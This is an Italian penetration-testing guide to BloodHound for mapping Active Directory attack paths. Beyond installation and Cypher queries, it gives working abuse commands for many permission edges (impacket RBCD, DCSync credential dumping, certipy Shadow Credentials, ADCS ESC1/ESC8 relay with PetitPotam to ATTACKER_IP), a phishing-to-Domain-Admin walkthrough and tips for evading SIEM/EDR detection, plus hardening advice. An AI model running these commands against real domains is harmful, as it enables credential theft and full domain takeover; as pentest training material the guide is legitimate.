---
title: 'BloodHound: Mappa Active Directory e Trova Attack Paths'
slug: bloodhound
description: Scopri come usare BloodHound per analizzare Active Directory e trovare escalation di privilegi. Tool essenziale per Red Team e attacchi interni simulati.
image: /BH.webp
draft: false
date: 2026-01-23T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - bloodhound
  - active directory
featured: false
---

# BloodHound: Guida Completa ad Active Directory Attack Path Analysis

BloodHound prende un dominio Active Directory con migliaia di utenti, gruppi, computer e GPO e lo trasforma in una mappa di relazioni che risponde a una sola domanda: **qual è il percorso più breve verso Domain Admin?**

Non serve essere un esperto AD per usarlo. Bastano credenziali di un utente standard, tre minuti di raccolta dati e BloodHound ti mostra — graficamente — chi può fare cosa, chi ha sessioni dove, e quali permessi anomali aprono strade verso la compromissione totale del dominio.

Questa guida copre installazione, raccolta con SharpHound, analisi degli attack paths, **abuse operativo per ogni edge**, Shadow Credentials, ADCS integration, Top 10 findings e cheat sheet finale. È il riferimento offensivo BloodHound per chi fa penetration test AD.

***

## Cos'è BloodHound — Active Directory Attack Path Analysis

BloodHound è una piattaforma di analisi della sicurezza per ambienti Active Directory basata su **teoria dei grafi**. Raccoglie dati dal dominio (utenti, gruppi, computer, sessioni, ACL, GPO, deleghe Kerberos) e li memorizza in un database a grafo, poi li interroga per trovare percorsi di escalation dei privilegi che un'analisi manuale non troverebbe mai in tempi ragionevoli.

Il concetto chiave: **Active Directory è una rete di relazioni, non un elenco di utenti**. Ogni assegnazione di permessi, ogni membership di gruppo, ogni sessione aperta è un arco nel grafo. BloodHound trova le catene di archi che portano da un utente compromesso a Domain Admin.

Domande concrete a cui risponde:

* Quali utenti hanno un percorso verso Domain Admin, anche indiretto?
* Chi ha GenericAll, WriteDacl, WriteOwner su oggetti critici?
* Dove ci sono sessioni amministrative sfruttabili per pivot?
* Quali computer hanno unconstrained delegation?
* Chi può fare DCSync?
* Quali template ADCS sono vulnerabili e chi li può sfruttare?

***

## Architettura — chi fa cosa

**Database a grafo (Neo4j / stack CE)**
Memorizza nodi (User, Group, Computer, GPO, OU, Domain) e relazioni (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl…). È il motore del pathfinding multi-step.

**Collector (SharpHound / bloodhound-python)**
Raccoglie i dati dal dominio e produce file JSON/ZIP importabili. Non fa analisi — produce solo il dataset grezzo.

**GUI BloodHound**
Interfaccia di analisi: import dati, query predefinite, pathfinding interattivo, Node Info, query Cypher custom.

***

## Installazione BloodHound CE

### Metodo consigliato — BloodHound CE con Docker su Kali

```bash
sudo apt update && sudo apt install -y docker.io docker-compose
sudo systemctl enable --now docker
sudo usermod -aG docker $USER && newgrp docker

mkdir -p ~/bloodhound-ce && cd ~/bloodhound-ce
curl -L https://ghst.ly/getbhce -o docker-compose.yml
sudo docker-compose up -d

# Recupera password iniziale
sudo docker-compose logs | grep "Initial Password"
```

GUI su `http://localhost:8080`.

```bash
# Porta occupata
sudo ss -lntp | grep -E '8080|7474|7687'

# Restart
sudo docker-compose down && sudo docker-compose up -d
```

### Metodo legacy — Neo4j + BloodHound su Kali

```bash
sudo apt install -y bloodhound neo4j
sudo neo4j start && bloodhound
```

Neo4j su `http://localhost:7474` — credenziali iniziali `neo4j/neo4j`.

### Windows lab

1. Installa [Neo4j Desktop](https://neo4j.com/download/), crea DBMS, avvialo
2. Verifica su `http://localhost:7474`
3. Scarica BloodHound legacy da [GitHub](https://github.com/BloodHoundAD/BloodHound/releases), avvia `BloodHound.exe`

***

## SharpHound — Raccolta Dati per Privilege Escalation

Non usare subito `--CollectionMethods All`. Struttura la raccolta per fasi.

**Fase 1 — mappatura iniziale (low noise)**

```powershell
SharpHound.exe --CollectionMethods Default,GroupMembership --Throttle 1000 --ExcludeDomainControllers
```

**Fase 2 — sessioni e admin locali**

```powershell
SharpHound.exe --CollectionMethods Session,LocalAdmin --Stealth
```

**Fase 3 — ACL (la fase più importante per trovare abuse paths)**

```powershell
SharpHound.exe --CollectionMethods ACL,Container,DCOM
```

**Fase 4 — loop sessioni**

```powershell
SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 01:00:00
```

**Raccolta completa**

```powershell
SharpHound.exe --CollectionMethods All
```

### bloodhound-python — da Linux

```bash
pip3 install bloodhound
bloodhound-python -d DOMINIO.LOCAL -u utente -p 'Password' -ns IP_DC -c all
```

***

## Import dati

**Legacy:** *Upload Data* → ZIP SharpHound.
**CE:** *File Ingest* → ZIP o JSON multipli.

Se non vedi nulla dopo import: Neo4j avviato? Credenziali DB corrette? ZIP non annidato? Versione collector compatibile?

***

## Uso pratico della GUI — BloodHound Tutorial

### Query predefinite

* **Find Shortest Paths to Domain Admins**
* **Find Principals with DCSync Rights**
* **Find Computers with Unconstrained Delegation**
* **Users with Most Local Admin Rights**
* **Dangerous ACLs (WriteDacl/GenericAll/WriteOwner)**

### Pathfinding

Source: utente compromesso → Target: `DOMAIN ADMINS` o `DC01`.
BloodHound disegna la catena. Leggi da sinistra a destra: ogni arco è una relazione abusabile.

### Node Info

Clicca qualsiasi nodo:

* **Inbound Control Rights** — chi controlla questo oggetto
* **Outbound Control Rights** — cosa controlla questo oggetto

Guarda sempre Outbound Control Rights su oggetti Tier-0.

***

## Oggetti Tier-0 — cosa controllare subito

In ogni assessment BloodHound, la prima cosa da fare è verificare chi ha controllo diretto o indiretto su questi oggetti. Se riesci a compromettere uno qualsiasi di questi, il dominio è compromesso.

| Oggetto            | Perché è Tier-0                                        |
| ------------------ | ------------------------------------------------------ |
| Domain Admins      | Accesso admin a tutti i computer del dominio           |
| Enterprise Admins  | Accesso admin a tutta la forest                        |
| Administrators     | Gruppo locale sui DC — equivale a DA                   |
| Domain Controllers | I DC stessi — chi li controlla controlla il dominio    |
| AdminSDHolder      | Template ACL per tutti gli account protetti            |
| KRBTGT             | Hash compromesso = Golden Ticket infiniti              |
| PKI / CA           | Compromissione ADCS = certificati per qualsiasi utente |
| ADFS               | Federation service — lateral movement verso cloud      |

Usa questa query per vedere chi ha percorsi verso i Tier-0:

```cypher
MATCH (u:User), (g:Group {highvalue:true}),
p=shortestPath((u)-[*1..]->(g))
WHERE NOT u.name STARTS WITH 'DOMAIN ADMINS'
RETURN p
```

***

## BloodHound Edge Abuse Reference — Cheat Sheet Completo

Questa è la sezione che manca nella maggior parte delle guide. BloodHound trova le relazioni, ma il lavoro reale è capire come sfruttarle. Tabella riassuntiva + dettaglio operativo per ogni edge.

| Edge                 | Impatto             | Abuse Primario                     |
| -------------------- | ------------------- | ---------------------------------- |
| GenericAll           | Full Control        | Reset Password, RBCD, Shadow Creds |
| GenericWrite         | Write Attributes    | Shadow Credentials, SPN Kerberoast |
| WriteDacl            | ACL Control         | Self-assign DCSync / AddMember     |
| WriteOwner           | Ownership Takeover  | Diventa owner → WriteDacl          |
| ForceChangePassword  | Account Takeover    | Password Reset via MSRPC           |
| AddMember            | Group Escalation    | Aggiungiti al gruppo               |
| AllowedToAct         | RBCD                | S4U2Proxy impersonation            |
| ReadLAPSPassword     | Local Admin Read    | Lateral Movement                   |
| AllExtendedRights    | Multiple Rights     | ForceChangePassword + ReadLAPS     |
| AddKeyCredentialLink | Shadow Credentials  | PKINIT → NTLM hash                 |
| SQLAdmin             | SQL Access          | xp\_cmdshell → RCE                 |
| ExecuteDCOM          | Remote Execution    | Lateral Movement                   |
| CanPSRemote          | PowerShell Remoting | Remote Shell                       |
| CanRDP               | Interactive Access  | Session access                     |
| AdminTo              | Local Admin         | Credential dump                    |
| HasSession           | Sessione Attiva     | Token/hash capture                 |
| DCSync               | Replication Rights  | Hash dump completo                 |
| Owns                 | Object Ownership    | WriteDacl chain                    |

***

### GenericAll su User

```bash
# Reset password
net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S DC_IP

# Con nxc
nxc smb DC_IP -u attacker -p 'Password' -d DOMINIO --set-password TARGET_USER 'NewPass123!'
```

### GenericAll su Computer → RBCD

```bash
impacket-addcomputer DOMINIO/attacker:'Password' -computer-name 'FAKE$' -computer-pass 'FakePass123!'
impacket-rbcd DOMINIO/attacker:'Password' -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP
impacket-getST DOMINIO/'FAKE$':'FakePass123!' -spn cifs/TARGET.DOMINIO.LOCAL -impersonate Administrator -dc-ip DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass TARGET.DOMINIO.LOCAL
```

### GenericAll / GenericWrite su Group → AddMember

```bash
net rpc group addmem "GRUPPO_TARGET" "attacker" -U "DOMINIO/attacker%Password" -S DC_IP
nxc ldap DC_IP -u attacker -p 'Password' -d DOMINIO --add-user-to-group "attacker" "GRUPPO_TARGET"
```

### GenericWrite su User → Shadow Credentials

Vedere sezione dedicata sotto.

### WriteDacl → DCSync

```powershell
# Aggiungi DCSync rights a te stesso
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

```bash
impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
```

→ Vedi [DCSync](/articoli/dcsync/)

### WriteOwner

```powershell
Set-DomainObjectOwner -Identity "GRUPPO_TARGET" -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity "GRUPPO_TARGET" -PrincipalIdentity attacker -Rights WriteMembers
```

### ForceChangePassword

```bash
net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S DC_IP
```

⚠️ Genera eventi 4723/4724 — visibile nei log.

### AdminTo + HasSession → Lateral Movement

```bash
evil-winrm -i SRV01 -u attacker -p 'Password'
# Una volta dentro: dump credenziali sessione attiva
```

→ Vedi [Pass-the-Hash](/articoli/pass-the-hash/) | [Mimikatz](/articoli/mimikatz/)

### DCSync Rights

```bash
impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
```

Output: hash NTLM di tutti gli utenti incluso `krbtgt`. → Golden Ticket.
→ Vedi [DCSync](/articoli/dcsync/) | [Kerberos](/articoli/kerberos/)

### Unconstrained Delegation

```powershell
# Da macchina con unconstrained delegation
Rubeus.exe monitor /interval:5 /nowrap
# Attendi/forza autenticazione DA → cattura TGT → Pass-the-Ticket
```

→ Vedi [Rubeus](/articoli/rubeus/)

### ReadLAPSPassword / AllExtendedRights

```bash
nxc ldap DC_IP -u attacker -p 'Password' -d DOMINIO -M laps
```

***

## Shadow Credentials — GenericWrite → NTLM Hash

Shadow Credentials è l'abuse più usato nel 2026 quando BloodHound mostra `GenericWrite` o `AddKeyCredentialLink` su un utente o computer. Non serve resettare la password — più silenzioso e reversibile.

**Concetto:** Active Directory supporta autenticazione tramite chiavi pubbliche (PKINIT). Se hai `GenericWrite` su un oggetto, puoi aggiungere una chiave pubblica al suo attributo `msDS-KeyCredentialLink`. Poi usi la chiave privata corrispondente per autenticarti via Kerberos PKINIT e ottenere l'hash NTLM dell'account target.

**Requisiti:** dominio con almeno un DC Windows Server 2016+ e PKINIT attivo (quasi sempre lo è in domini moderni).

```bash
# Installa certipy
pip3 install certipy-ad

# Aggiungi shadow credential all'utente target
certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET_USER -dc-ip DC_IP
```

Output diretto: hash NTLM di `TARGET_USER`. Usalo con Pass-the-Hash o cracka offline.

```bash
# Per un computer (se hai GenericAll su Computer)
certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET_COMPUTER$ -dc-ip DC_IP
```

Ottieni l'hash del computer account — utile per RBCD o per estrarre credenziali GMSA.

**Cleanup:** certipy rimuove automaticamente la chiave aggiunta se usi `shadow auto`. Se vuoi gestirlo manualmente:

```bash
certipy shadow add    # aggiunge
certipy shadow remove # rimuove
```

***

## AddKeyCredentialLink — Edge Dedicato

BloodHound mostra `AddKeyCredentialLink` separatamente da GenericWrite in alcuni contesti. La tecnica è identica a Shadow Credentials — l'edge rappresenta esattamente il permesso di scrivere su `msDS-KeyCredentialLink`.

Se vedi questo edge su un utente o computer Tier-0, è un percorso diretto verso la compromissione di quell'account senza toccare la password.

```bash
certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET -dc-ip DC_IP
```

***

## BloodHound e Active Directory Certificate Services (ADCS)

BloodHound CE ha integrazione nativa con ADCS. In quasi ogni assessment AD moderno, i template ADCS vulnerabili sono tra i percorsi più veloci verso Domain Admin — spesso più veloci degli abuse ACL classici.

### ESC1 — Template con Client Authentication e Subject Alternative Name controllabile

BloodHound mostra il template come `Enrollable` da utenti non-privilegiati + `SubjectAltRequireUpn` o simili.

```bash
# Enumera con certipy
certipy find -u attacker@corp.local -p 'Password' -dc-ip DC_IP -vulnerable

# Richiedi certificato impersonando un DA
certipy req -u attacker@corp.local -p 'Password' -ca CA_NAME -template TEMPLATE_VULNERABILE -upn administrator@corp.local -dc-ip DC_IP

# Autenticati e ottieni hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

→ Vedi [ESC1](/articoli/esc1-adcs/)

### ESC4 — WriteProperty sul template

Se BloodHound mostra che hai `WriteProperty` su un template ADCS, puoi modificarlo per renderlo ESC1 e poi sfruttarlo.

```bash
# Modifica il template per abilitare SAN
certipy template -u attacker@corp.local -p 'Password' -template TEMPLATE -save-old
# Poi sfrutta come ESC1
```

→ Vedi [ESC4](/articoli/esc4-adcs/)

### ESC8 — NTLM Relay verso Web Enrollment

Se la CA ha Web Enrollment attivo senza EPA/signing, puoi fare relay NTLM verso `http://CA/certsrv/` e richiedere un certificato per qualsiasi account, incluso un DC.

```bash
# Setup relay
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Forza autenticazione DC (PetitPotam)
python3 PetitPotam.py ATTACKER_IP DC_IP
```

→ Vedi [ESC8](/articoli/esc8-adcs/)

### ESC13 — Group-Linked Template Abuse

BloodHound CE mostra percorsi ESC13 quando un template è collegato a un gruppo che eredita permessi elevati.

→ Vedi [ESC13](/articoli/esc13-adcs/)

***

## Top 10 BloodHound Findings — Privilege Escalation Checklist

In ogni assessment AD, verifica questi 10 finding in questo ordine. Sono ordinati per impatto e frequenza nei domini reali.

**1. DCSync Rights**
Chi oltre ai DC ha `DS-Replication-Get-Changes-All` sul domain object? Spesso account di backup o vecchi admin. → Compromissione immediata di tutti gli hash.

**2. GenericAll su oggetti Tier-0**
Un utente non-privilegiato con GenericAll su Domain Admins o su un DC è game over.

**3. WriteDacl sul Domain Object**
Permette di assegnarsi DCSync rights. Raro ma devastante.

**4. Shadow Credentials (GenericWrite / AddKeyCredentialLink)**
Nel 2026 è uno dei finding più comuni su domini con deleghe legacy. Silenzioso e reversibile.

**5. Unconstrained Delegation su Computer non-DC**
Qualsiasi server con unconstrained delegation è un pivot per catturare TGT di DA che si autenticano verso di esso.

**6. RBCD (AllowedToAct)**
Se puoi scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` su un computer, impersoni chiunque verso di esso.

**7. ReadLAPSPassword**
Lateral movement immediato verso tutte le macchine gestite da LAPS che l'utente può leggere.

**8. DA Session su Workstation Utente**
Un Domain Admin loggato su una workstation normale. Trova la workstation, accedi, dumpa le credenziali.

**9. AdminSDHolder Abuse**
Permessi anomali su AdminSDHolder si propagano a tutti gli account protetti ogni 60 minuti. Finding raro ma impatto massimo.

**10. ADCS ESC Paths**
BloodHound CE mostra direttamente i percorsi ADCS. ESC1 e ESC8 sono i più frequenti nei domini enterprise.

***

## Query Cypher — BloodHound Cheat Sheet

**Attack paths verso DA da utenti Kerberoastable**

```cypher
MATCH (u:User {hasspn:true}), (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((u)-[*1..]->(g))
RETURN p
```

**ACL pericolose su oggetti Tier-0**

```cypher
MATCH (u:User)-[r:GenericAll|WriteDacl|WriteOwner|GenericWrite|Owns|AddKeyCredentialLink]->(n)
WHERE n.highvalue = true
RETURN u.name, type(r), n.name
ORDER BY type(r)
```

**Computer con unconstrained delegation (no DC)**

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH 'DC'
RETURN c.name
```

**Sessioni DA attive su workstation**

```cypher
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer)
WHERE NOT c.name CONTAINS 'SRV'
RETURN u.name, c.name
```

**Utenti con GenericWrite su altri utenti**

```cypher
MATCH (u:User)-[r:GenericWrite|GenericAll|AddKeyCredentialLink]->(t:User)
WHERE NOT u.name = t.name
RETURN u.name, type(r), t.name
```

***

## Scenario pratico — da utente standard a Domain Admin

Scenario: credenziali di `j.smith@corp.local` da phishing.

**1. Raccogli dati**

```bash
bloodhound-python -d corp.local -u j.smith -p 'Pass123!' -ns 10.10.10.10 -c all
```

**2. Importa e lancia Shortest Path to Domain Admins**

BloodHound mostra:

```
j.smith → MemberOf → HelpDesk_Ops
HelpDesk_Ops → AdminTo → SRV-WEB01
SRV-WEB01 → HasSession → svc_sql
svc_sql → MemberOf → Domain Admins
```

**3. Accedi a SRV-WEB01**

```bash
evil-winrm -i 10.10.10.20 -u j.smith -p 'Pass123!'
```

**4. Dump credenziali sessione svc\_sql dalla macchina**

→ Vedi [Mimikatz](/articoli/mimikatz/) | [Pass-the-Hash](/articoli/pass-the-hash/)

**5. DCSync finale con svc\_sql (Domain Admin)**

```bash
impacket-secretsdump corp.local/svc_sql:'SvcPass!'@10.10.10.10 -just-dc-ntlm
```

Dominio compromesso.

***

## OPSEC — cosa genera rumore

**SharpHound `--CollectionMethods All`**: query LDAP ad alto volume verso i DC. Visibile in SIEM. Usa le fasi + `--Throttle`.

**Session enumeration**: contatta ogni host via SMB — genera connessioni che i SIEM rilevano come scan interno.

**ACL abuse (WriteDacl, AddMember)**: genera eventi 4662, 4728, 4732 nei log AD. Se auditpol è attivo, finiscono nel SIEM.

**Shadow Credentials**: genera eventi 5136 (modifica attributo oggetto AD). Meno conosciuto dai blue team, ma presente nei log.

**Mitigazioni per bassa detection**:

* Raccolta in fasi con `--Throttle`
* `--Stealth` per session collection
* `bloodhound-python` da Kali genera meno rumore sul target
* Per ambienti con EDR attivo: considera `ldapdomaindump` o `windapsearch` come alternativa

***

## Hardening AD — come ridurre l'attack surface

**Ripulisci ACL pericolose**: rimuovi GenericAll/WriteDacl/WriteOwner da utenti non-admin su oggetti AD. Usa la query BH "Dangerous ACLs" come backlog di remediation.

**Pulisci membership annidate e privilege creep**: ogni trimestre — query *Users with Most Local Admin Rights*.

**Separa i tier**: admin AD non logga su workstation utente. Tier 0 (DC, PKI), Tier 1 (server), Tier 2 (workstation) — sessioni e credenziali separate.

**LAPS**: elimina le password condivise sulle macchine. Spezza il lateral movement orizzontale.

**Disabilita unconstrained delegation**: la maggior parte dei server non ne ha bisogno. Usa constrained delegation o RBCD.

**Controlla GPO**: una GPO modificabile da un non-admin è code execution su tutti i computer target. Usa la query BH dedicata.

**Audita i template ADCS**: esegui `certipy find -vulnerable` trimestralmente. ESC1 e ESC8 compaiono spesso dopo aggiornamenti o configurazioni legacy.

***

## BloodHound Workflow — Cheat Sheet Finale

```
1.  COLLECT     → SharpHound per fasi (Default → LocalAdmin+Session → ACL)
2.  IMPORT      → Carica ZIP in BloodHound CE / legacy
3.  DA PATHS    → Find Shortest Paths to Domain Admins
4.  TIER-0      → Controlla chi ha controllo su DA, EA, DC, KRBTGT, PKI
5.  ACL AUDIT   → Dangerous ACLs (GenericAll, WriteDacl, WriteOwner, AddKeyCredentialLink)
6.  SESSIONS    → DA sessions su workstation non-admin
7.  DELEGATION  → Unconstrained Delegation + RBCD paths
8.  DCSYNC      → Chi ha DS-Replication-Get-Changes-All oltre ai DC
9.  ADCS        → BloodHound CE ESC paths + certipy find -vulnerable
10. VALIDATE    → Testa l'abuse su ogni finding critico
11. REPORT      → Documenta path, screenshot, impatto, remediation
```

***

## FAQ

**BloodHound CE o legacy?**
CE con Docker è il metodo attuale. Legacy è ancora usato in lab vecchi. Le query Cypher funzionano su entrambi.

**Posso usare BloodHound senza essere admin del dominio?**
Sì. Un utente standard raccoglie la maggior parte dei dati via query LDAP autenticate normali.

**BloodHound viene rilevato dagli EDR?**
SharpHound viene flaggato da molti AV/EDR per firma. Considera bloodhound-python da Kali in ambienti con EDR attivo.

**Quanto ci vuole la raccolta su un dominio grande?**
`Default,GroupMembership` su 10.000 oggetti: 2–5 minuti. `All` con sessioni: 15–30 minuti.

**Qual è la differenza tra BloodHound e SharpHound?**
BloodHound è la piattaforma di analisi. SharpHound è il collector. Senza SharpHound, BloodHound è vuoto.

**Shadow Credentials funziona sempre?**
Richiede almeno un DC Windows Server 2016+ con PKINIT attivo. In domini moderni funziona quasi sempre. In domini molto vecchi (2008/2012 only) no.

***

> **Disclaimer:** tutto il contenuto è per uso su sistemi autorizzati in contesti di penetration test legali o audit difensivo. L'uso non autorizzato è illegale.
